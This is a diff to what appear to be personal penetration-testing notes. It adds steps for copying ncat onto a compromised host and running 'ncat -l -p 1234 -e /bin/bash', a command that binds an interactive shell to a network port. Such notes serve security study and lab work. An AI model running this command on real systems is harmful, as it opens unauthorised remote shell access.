@@ -86,3 +86,11 @@ to list more info about a specific module
 search for SUID marked files
 
     $ cat binary |strings|grep 'word'
+
+if we have a limited shell and don't have a good ncat we can copy one over to an executable dir
+
+then forward our shell to a listening port 
+
+    $ wget 
+
+    $ /home/dev/bin/ncat -v -l -p 1234 -e /bin/bash
